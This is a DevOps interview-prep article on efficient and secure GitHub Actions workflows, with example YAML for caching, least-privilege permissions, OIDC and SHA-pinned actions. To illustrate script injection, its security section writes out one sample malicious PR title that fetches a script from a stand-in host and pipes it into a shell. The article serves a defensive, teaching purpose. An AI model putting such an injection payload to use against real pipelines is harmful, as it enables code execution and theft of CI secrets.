---
title: "How do you write an efficient and secure GitHub Actions workflow?"
id: 457
category: "CI/CD"
difficulty: "Intermediate"
tags:
  - devops
  - cicd
  - interview-questions
  - devsecops
  - version-control
---

# How do you write an efficient and secure GitHub Actions workflow?

**Short answer:** Efficiency comes from four things: **`needs`** to express the real dependency graph so independent jobs run in parallel, **`matrix`** to fan out across versions or platforms with `fail-fast` and `max-parallel` tuned, **caching** (`actions/cache`, `setup-*` built-in caches, and registry-backed Docker layer cache) so cold runners are not cold, and **`concurrency`** plus path filters so you never run work nobody needs. Security comes from a different four: **least-privilege `permissions`** at workflow and job level (the default token is far broader than most jobs need), **OIDC federation** to your cloud instead of stored long-lived keys, **pinning third-party actions to a commit SHA** rather than a mutable tag, and treating `pull_request_target` and `workflow_run` as privileged - never checking out and running untrusted PR code in a context that holds secrets. The sentence that ties it together: a workflow is code with production credentials, so it gets the same review, pinning, and least-privilege treatment as anything else you deploy.

## Detail

### Structure: `needs`, `matrix`, and what runs in parallel

Jobs run in parallel by default; `needs` is what serialises them. So the design question is which jobs genuinely depend on which. `needs` also gives you the dependency's outputs (`needs.build.outputs.tag`), which is how you pass a computed image tag downstream without a file.

`matrix` expands a job across axes, with `include` to add one-off combinations, `exclude` to remove invalid ones, `fail-fast: false` when you want the full picture rather than the first failure, and `max-parallel` when the fan-out would exhaust runners or hammer a shared dependency.

The pair interviewers ask about together - **`needs` versus `concurrency`** - do different things. `needs` orders jobs **within one run**. `concurrency` limits **across runs**: a group key plus `cancel-in-progress` so a new push supersedes an in-flight run. Use `cancel-in-progress: true` on PR validation (cancelling a stale check is free) and **false** on deploys (cancelling a half-applied deployment is worse than queueing).

### Caching that actually helps

- **Use the `setup-*` action's built-in cache** first (`setup-node` with `cache: npm`, `setup-java` with `cache: maven`, `setup-python` with `cache: pip`). It handles the key correctly for you.
- **`actions/cache`** for anything else, with a key that includes a **hash of the lockfile** plus a `restore-keys` prefix so a near-miss still restores something useful.
- **Docker layers**: `docker/build-push-action` with `cache-from: type=gha` / `cache-to: type=gha,mode=max`, or a registry cache. Without this, every build on a fresh runner rebuilds every layer - which is the number one reason Actions pipelines are slow.
- Know the limits: caches are scoped per branch (a PR reads `main`'s cache but writes its own), there is a repository size ceiling with LRU eviction, and cache restore is a network download - caching something small and cheap to recompute can be slower than recomputing it.
- **Artifacts are not caches.** Artifacts pass build outputs between jobs and to humans; caches speed up recomputation. Using an artifact where a cache belongs (or vice versa) shows up as a slow, confusing pipeline.

### Security, in the order it matters

**1. `permissions`.** The `GITHUB_TOKEN` default can be write-all in older repositories. Set `permissions: contents: read` at the workflow root and elevate per job only where needed (`packages: write` to push an image, `id-token: write` for OIDC, `pull-requests: write` to comment). This is the cheapest, highest-value control in the whole file.

**2. OIDC instead of stored cloud keys.** `permissions: id-token: write` plus `aws-actions/configure-aws-credentials` (or the Azure/GCP equivalent) exchanges a short-lived GitHub token for cloud credentials with no secret in the repository at all. Constrain the cloud-side trust policy to your **repository and ref** (`repo:acme/api:ref:refs/heads/main`, or an environment) - a trust policy with `repo:acme/*:*` is a wide-open door. This is also the direct answer to "IAM user versus GitHub OIDC role versus a stored key - which is more secure?"

**3. Pin third-party actions to a full commit SHA.** A tag is mutable: `@v3` can be moved to malicious code, and this has happened in the wild. `uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1` with Dependabot keeping the SHAs current. For very sensitive repositories, vendor the action or use an internal allowlist: the organisation or enterprise allowed-actions policy can restrict which actions may run, block specific actions or versions, and (since August 2025) **require full-SHA pinning**, failing any workflow that references a tag. Note the limit: a pinned action can still download unpinned code at runtime.

**4. Untrusted code and privileged triggers.** `pull_request` from a fork gets **no secrets** and a read-only token - that is the safe default. `pull_request_target` runs in the **base** repository's context with secrets, and the dangerous anti-pattern is checking out `github.event.pull_request.head.sha` inside it and then running the PR's build scripts, which is remote code execution with your secrets. If you need a privileged action on a PR, do the untrusted build in a `pull_request` job, upload an artifact, and process it in a separate `workflow_run` job that never executes fork code. Also require approval for first-time contributors.

**5. Script injection.** `run: echo "${{ github.event.pull_request.title }}"` interpolates attacker-controlled text straight into a shell. An issue titled `"; curl evil.sh | sh #` executes. Pass untrusted values through `env:` and reference them as `"$TITLE"` inside the script, where the shell treats them as data.

**6. Secrets hygiene.** Use environment-scoped secrets with required reviewers for production, never `echo` a secret, remember masking only covers exact matches (a base64-encoded or partially-printed secret is not masked), and prefer OIDC so there is nothing to leak.

**7. Self-hosted runners.** Never attach self-hosted runners to a public repository - a fork PR can run code on them. Make them ephemeral (one job per runner, then destroy) so nothing persists between builds, run them with least privilege in their network, and remember they can reach your internal network, which is exactly why they are attractive to an attacker. Use them for private repositories where you need internal access, specific hardware, or cheaper long-running builds.

### Reuse

Two mechanisms, and knowing the difference matters. **Composite actions** package a sequence of _steps_ for use inside a job. **Reusable workflows** (`uses: acme/.github/.github/workflows/build.yml@v3` with `workflow_call`) package whole _jobs_, take `inputs` and `secrets`, and are how you give fifty repositories the same pipeline with a few parameters. Reusable workflows plus an organisation-level `.github` repository is the Actions answer to Jenkins shared libraries.

## Example

```yaml
name: api
on:
  push:
    branches: [main]
    paths: ["services/api/**", ".github/workflows/api.yml"]
  pull_request:
    branches: [main]

permissions:
  contents: read # least privilege at the root; elevate per job

concurrency:
  group: api-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
  test:
    runs-on: ubuntu-24.04
    strategy:
      fail-fast: false # see every failing version, not just the first
      max-parallel: 4
      matrix:
        node: [22, 24] # supported LTS lines; Node 20 reached end of life in April 2026
        include:
          - node: 24
            coverage: true
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with:
          node-version: ${{ matrix.node }}
          cache: npm # built-in dependency cache, keyed correctly for you
      - run: npm ci && npm test
      - if: matrix.coverage
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with: { name: coverage, path: coverage/ }

  build:
    needs: test # ordering within this run
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      packages: write # only this job needs to push
    outputs:
      tag: ${{ steps.meta.outputs.tag }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - id: meta
        run: echo "tag=${GITHUB_SHA::12}" >> "$GITHUB_OUTPUT"
      - uses: docker/login-action@dbcb813823bdd20940b903addbd779551569679f # v4.6.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }} # scoped by the packages: write grant above
      - uses: docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069 # v4.4.1
      - uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0
        with:
          context: services/api
          push: true
          tags: ghcr.io/acme/api:${{ steps.meta.outputs.tag }}
          cache-from: type=gha # without this, every layer rebuilds
          cache-to: type=gha,mode=max

  deploy:
    needs: build
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-24.04
    environment: production # required reviewers + environment-scoped secrets
    permissions: { contents: read, id-token: write } # only this job needs OIDC
    steps:
      - uses: aws-actions/configure-aws-credentials@e1253824e5c10ff9df46874f81ed3ec929e19cfd # v6.3.0
        with:
          role-to-assume: arn:aws:iam::111122223333:role/gha-api-deploy # no stored keys
          aws-region: eu-west-1
      - run: echo "Deploying ${{ needs.build.outputs.tag }}" # output passed via needs
```

```yaml
# Untrusted input: pass through env, never interpolate into a shell
- name: Comment on the PR
  env:
    TITLE: ${{ github.event.pull_request.title }} # data, not code
    BODY: ${{ github.event.pull_request.body }}
  run: |
    printf 'PR title: %s\n' "$TITLE"     # safe: the shell sees a variable
```

```yaml
# Reusable workflow: one pipeline definition, many repositories
# .github/workflows/build.yml in the acme/.github repository
on:
  workflow_call:
    inputs:
      service: { required: true, type: string }
    secrets:
      SONAR_TOKEN: { required: false }
# consumer repository:
jobs:
  build:
    uses: acme/.github/.github/workflows/build.yml@v3
    with: { service: payments }
    secrets: inherit
```

## Interview tips

- Answer in two halves - efficiency and security - and name four things in each. Structure is what makes this answer memorable rather than a list of YAML keys.
- Distinguish `needs` from `concurrency` explicitly: ordering within a run versus limiting across runs. Then add the judgement call - cancel in-progress PR runs, queue deploys.
- For caching, mention the `setup-*` built-in caches first, lockfile-hashed keys with `restore-keys`, and `type=gha` Docker layer cache. Saying "a fresh runner has no cache, so ordering your Dockerfile achieves nothing without an imported cache" is the insight.
- Say `permissions: contents: read` at the root, elevated per job. It is the single cheapest hardening step and interviewers notice when candidates know the default is too broad.
- Recommend OIDC over stored cloud keys, and immediately add the trust-policy constraint on `repo:` and `ref:` - an unconstrained trust policy defeats the whole point.
- Pin actions to a commit SHA and explain that tags are mutable, with Dependabot keeping them current - and mention that organisations can now enforce SHA pinning by policy.
- Bring up `pull_request` versus `pull_request_target` unprompted, describe the RCE pattern, and give the safe alternative (untrusted build uploads an artifact; a separate privileged workflow consumes it). Add the script-injection example with `env:`.
- Warn against self-hosted runners on public repositories and recommend ephemeral runners. See [how do you prevent and handle secret leaks in CI/CD pipelines](./how-do-you-prevent-and-handle-secret-leaks-in-ci-cd-pipelines.md), [what is GitHub Actions](../advanced-devops-cloud/what-is-github-actions.md), [how do you trigger a pipeline](./how-do-you-trigger-a-pipeline-webhooks-polling-schedules-and-upstream-jobs.md), [speeding up a slow pipeline](./how-do-you-speed-up-a-slow-ci-cd-pipeline.md), and [authenticating to AWS without long-lived access keys](../aws-engineering/how-do-you-authenticate-to-aws-without-long-lived-access-keys.md).

<!-- BEGIN GENERATED RELATED TOPICS -->

## Related Concepts

- [[How do you manage build artefacts with Nexus or Artifactory?]] (`#460`): [How do you manage build artefacts with Nexus or Artifactory?](../devops-tools-and-automation/how-do-you-manage-build-artefacts-with-nexus-or-artifactory.md)
- [[How do you rotate secrets without downtime?]] (`#429`): [How do you rotate secrets without downtime?](../devsecops/how-do-you-rotate-secrets-without-downtime.md)
- [[How do you troubleshoot a GitOps pipeline that will not sync?]] (`#428`): [How do you troubleshoot a GitOps pipeline that will not sync?](../devops-tools-and-automation/how-do-you-troubleshoot-a-gitops-pipeline-that-will-not-sync.md)

<!-- END GENERATED RELATED TOPICS -->

---

[⬅ Back to CI/CD](./README.md) · [All topics](../README.md)
